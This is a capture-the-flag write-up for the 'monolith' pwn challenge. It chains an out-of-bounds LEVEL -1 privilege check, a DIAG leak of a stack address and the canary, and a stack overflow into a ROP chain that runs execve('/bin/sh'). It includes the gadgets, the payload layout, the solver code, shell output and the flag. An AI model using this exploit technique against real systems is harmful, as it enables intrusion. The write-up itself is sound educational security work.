# monolith

> Category: Pwn
> CTF: TRYHARDS
> Year: 2026

## Description
>We are given `monolith`, a statically linked, stripped, non-PIE x86-64 diagnostic shell that exposes a small firmware-style command prompt (`PING`, `LEVEL`, `DIAG`, `QUIT`). Two bugs compose into a full exploit. `LEVEL` accepts an argument in `-1..7` and then uses it as a signed index into a level table without rejecting the negative index, so `LEVEL -1` reads a value before the table and sets the privileged `elevated` flag (an out-of-bounds read used as a privilege check). The privileged `DIAG` command then prints both a stack buffer address and the process stack canary, and reads a packet of up to `0x400` bytes into a stack buffer at `rbp-0xb0` even though the function only reserves a `0xd0`-byte frame. We leak the guard, keep it intact during the overflow, and ROP into `execve("/bin/sh", ...)` using fixed gadgets from the non-PIE binary.

---

## Initial Analysis

### Source Code / Binary

The supplied archive contains a single file:

```text
monolith.zip
└── monolith        # 34328-byte static ELF
```

```bash
$ file monolith
monolith: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped, BuildID[sha1]=f54e67ad79a74e5d5b5da45b6258470994f213e6
```

The program is a tiny line-oriented shell:

```text
$ ./monolith
MONOLITH diagnostic shell -- firmware rev 4
>
```

The command loop lives at `0x4014ac` and is called from `main` at `0x4015ff`. Each iteration prints `> ` (`0x406105`) and reads a line into an `0x80`-byte stack buffer with a custom `read`-per-byte loop, then compares it against the command strings in `.rodata`. `LEVEL` is matched by its first six bytes (`"LEVEL "`), and the handler receives `buf + 6`:

| command | handler | effect |
|---|---|---|
| `PING` | `0x40124c` | prints `pong` |
| `LEVEL <n>` | `0x401289` | parses `n`, sets the unit level and `elevated` |
| `DIAG` | `0x401389` | privileged telemetry and binary packet |
| `QUIT` | inline | prints `bye` and exits |

### Protections

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   Yes
```

Two facts decide the strategy:

- **No PIE** means every gadget, string, and global is at a fixed address.
- **NX enabled** rules out shellcode on the stack, so the overflow must become a ROP chain.

`checksec` reports **no canary**, but that is a false negative caused by the static, stripped musl build: there is no `__stack_chk_fail` symbol to detect. The disassembly shows a guard in every vulnerable frame:

```asm
mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax
...
sub    rax,QWORD PTR fs:0x28
je     0x4014aa
call   0x4018d3          ; hlt
```

So the overflow must preserve the canary. Fortunately, the program hands it to us.

### Vulnerability

#### The privilege check (LEVEL -1)

`0x401289` parses the argument with `strtol(base 10)` and rejects values outside `-1..7`:

```asm
4012e6 cmp    QWORD PTR [rbp-0x58],0xffffffffffffffff
4012eb jl     0x4012f4          ; < -1  -> "level: out of range"
4012ed cmp    QWORD PTR [rbp-0x58],0x7
4012f2 jle    0x401305          ; -1..7 accepted
...
401309 mov    DWORD PTR [rip+0x6d35],eax        # level
401317 lea    rdx,[rax*4+0x0]
40131f lea    rax,[rip+0x6cfe]                  # 0x408024 (table)
401326 mov    eax,DWORD PTR [rdx+rax*1]         # table[level]
401329 cmp    eax,0x1f3
40132e setg   al                                # elevated = table[level] > 499
```

The table at `0x408024` contains `0, 10, 20, 30, 40, 50, 60, 70`, so none of the valid levels `0..7` can exceed `499`. But `-1` is accepted by the range check and indexes four bytes before the table, at `0x408020`, which holds `999999`:

```text
0x408020: 3f 42 0f 00   -> 0x000f423f = 999999
0x408024: 00 00 00 00   -> table[0] = 0
0x408028: 0a 00 00 00   -> table[1] = 10
...
```

```text
> LEVEL -1
level: set to -1 (elevated=1)
```

The privilege check is an out-of-bounds read, and "level -1" is the key.

#### The telemetry leak (DIAG)

`0x401389` refuses to run unless `elevated` is set:

```text
> DIAG
diag: requires an elevated unit
```

Once elevated, it formats a telemetry line with the address of its local packet buffer (`rbp-0xb0`) and the qword stored at the global `0x4081b0`:

```asm
4013c1 mov    rax,QWORD PTR [rip+0x6de8]        # 0x4081b0
4013c8 mov    QWORD PTR [rbp-0xc0],rax
4013cf lea    rdx,[rbp-0xb0]                    # &packet
4013e4 mov    rcx,rdx
4013e7 lea    rdx,[rip+0x4c92]                  # "telemetry: buf=0x%lx guard=0x%lx\n"
...
4013fb call   snprintf
401407 call   0x40114d          ; puts-like helper
```

`0x4081b0` is the same global used by musl's `__init_canary` (`0x40188d`). At startup it copies eight bytes of `AT_RANDOM`, zeroes byte 1, writes the value to `0x4081b0`, and installs it into `fs:0x28`:

```asm
4018aa mov    BYTE PTR [rbx+0x1],0x0
4018ae mov    rdx,QWORD PTR [rbx]
4018ba mov    QWORD PTR [rax+0x28],rdx          # fs:0x28 = canary
```

That means the leaked `guard` is exactly the stack canary value compared at function epilogues. A single `DIAG` leaks both ASLR (the stack buffer address) and the stack protector:

```text
> LEVEL -1
level: set to -1 (elevated=1)
> DIAG
telemetry: buf=0x7fffc77e1e40 guard=0xd976037c823d0056
diag: awaiting binary packet
```

#### The overflow

After printing telemetry, `DIAG` reads a binary packet into the buffer at `rbp-0xb0`, looping until it has consumed `0x400` bytes:

```asm
401428 mov    eax,0x400
40142d sub    rax,QWORD PTR [rbp-0xc8]          # 0x400 - count
...
401453 call   read
```

The read length is capped at `0x400`, but the destination starts at `rbp-0xb0` while the frame only reserves `0xd0` bytes. The packet therefore runs far past the saved return address. The frame layout is:

| offset from `buf` | contents |
|---:|---|
| `0x000` | packet buffer start (`rbp-0xb0`) |
| `0x0a8` | stack canary (`rbp-0x8`) |
| `0x0b0` | saved `rbp` |
| `0x0b8` | saved return address |
| `0x300` | our staged data (strings/arrays) |
| `0x3ff` | end of the `0x400`-byte read |

A `0x400`-byte packet reaches the return address with `0x348` bytes of space to spare, which is plenty for a syscall ROP chain.

## Solution

Because the binary is static, non-PIE, and offers a raw `syscall; ret`, no libc is involved. The chain is built from five gadgets:

| gadget | address | notes |
|---|---|---|
| `pop rax ; ret` | `0x401001` | |
| `pop rdi ; ret` | `0x402504` | |
| `pop rsi ; ret` | `0x401a4f` | |
| `pop rdx ; jmp 0x404b58` | `0x404b99` | `0x404b58` is `add rsp,0x28 ; ret` |
| `syscall ; ret` | `0x401656` | `ret` at `0x401658` |

There is no clean `pop rdx ; ret`, so `pop rdx` jumps into a stack pivot-like epilogue that adds `0x28` (five qwords) to `rsp` before returning. The helper therefore emits the gadget, the value, five filler qwords, and then continues:

```python
def set_rdx(v):
    return flat(POP_RDX_JMP, v, 0, 0, 0, 0, 0)
```

### Payload layout

The leaked `buf` address makes every pointer in the payload deterministic. The exploit stages the shell path, the `argv` array, a valid `envp` array, and a failure message in the same overflow buffer, then references them from the ROP chain:

| offset | contents |
|---:|---|
| `0x000-0x0a7` | padding |
| `0x0a8` | leaked `guard` |
| `0x0b0` | saved `rbp` = `0` |
| `0x0b8` | ROP chain |
| `0x300` | `"/bin/sh\0"` |
| `0x320` | `argv = [buf+0x300, NULL]` |
| `0x340` | `envp = [NULL, NULL]` |
| `0x360` | `"EXEC_FAILED\n"` |

The chain performs three actions:

1. `write(1, "/bin/sh\0", 8)` as a diagnostic that the leak and chain are correct.
2. `execve("/bin/sh", argv, envp)` with `rax = 59`.
3. If `execve` somehow returns, `write(1, "EXEC_FAILED\n", 12)` so a failure is visible instead of a silent crash.

`envp` is a real pointer to a `NULL` entry rather than a literal `NULL`, which avoids relying on kernel tolerance for a null environment. The total chain is 336 bytes, ending at `buf+0x208`, well before the staged data at `buf+0x300`.

## Exploit

The full solver is in [`solve.py`](solve.py). The core of the chain:

```python
rop = b''
# write(1, "/bin/sh\0", 8)
rop += flat(POP_RDI, 1)
rop += flat(POP_RSI, shell_str)
rop += set_rdx(8)
rop += flat(POP_RAX, 1, SYSCALL_RET)

# execve("/bin/sh", ["/bin/sh", NULL], [NULL])
rop += flat(POP_RDI, shell_str)
rop += flat(POP_RSI, argv_ptr)
rop += set_rdx(envp_ptr)
rop += flat(POP_RAX, 59, SYSCALL_RET)

# fallback: write(1, "EXEC_FAILED\n", 12)
rop += flat(POP_RDI, 1)
rop += flat(POP_RSI, fail_msg)
rop += set_rdx(12)
rop += flat(POP_RAX, 1, SYSCALL_RET)

payload = bytearray(TOTAL)
payload[0:CANARY_OFF]                   = b'A' * CANARY_OFF
payload[CANARY_OFF:CANARY_OFF+8]        = p64(guard)
payload[SAVED_RIP:SAVED_RIP+len(rop)]   = rop
payload[SHELL_OFF:SHELL_OFF+8]          = b'/bin/sh\x00'
payload[ARGV_OFF:ARGV_OFF+8]            = p64(shell_str)
payload[ARGV_OFF+8:ARGV_OFF+16]         = p64(0)
payload[ENVP_OFF:ENVP_OFF+8]            = p64(0)
payload[ENVP_OFF+8:ENVP_OFF+16]         = p64(0)
payload[FAIL_OFF:FAIL_OFF+12]           = b'EXEC_FAILED\n'
```

Running locally:

```text
$ python3 solve.py
[+] Starting local process './monolith': pid 124775
[+] buf=0x7fffc77e1e40  guard=0xd976037c823d0056
[*] shell=0x7fffc77e2140  argv=0x7fffc77e2160  envp=0x7fffc77e2180
[*] ROP size 336B, ends at 0x208

diag: packet processed
/bin/shPWNED
uid=1000(da3m0ns) gid=1000(da3m0ns) ...
/home/da3m0ns/Desktop/Competition/Tryhards-Nov/pwn/monolith
...
TryHards{residue_left_the_vault_open_7f3ac19e2b}
```

Against a remote instance, the same script switches to the `HOST`/`PORT` arguments:

```bash
python3 solve.py REMOTE HOST=<host> PORT=<port>
```

## Flag

```text
TryHards{residue_left_the_vault_open_7f3ac19e2b}
```

## Takeaways

- A signed index is only as safe as the range check that guards it. Allowing `-1` in a table lookup is an out-of-bounds read, and here that read *is* the authentication check.
- Leaking a stack address and the canary in the same line defeats ASLR and stack cookies simultaneously. Any "diagnostic" command that prints internal state is a primary target.
- `checksec` can under-report canaries on static, stripped musl binaries because it looks for `__stack_chk_fail`. Always confirm by reading the function prologue/epilogue for `fs:0x28`.
- A static, non-PIE binary with a `syscall; ret` gadget is self-contained: no libc base, no leak needed for code, and fixed addresses make a clean `execve` chain possible.
- When a convenient `pop rdx ; ret` is missing, a `pop rdx ; jmp <add rsp, 0x28 ; ret>` gadget works as long as the extra stack slots are accounted for.
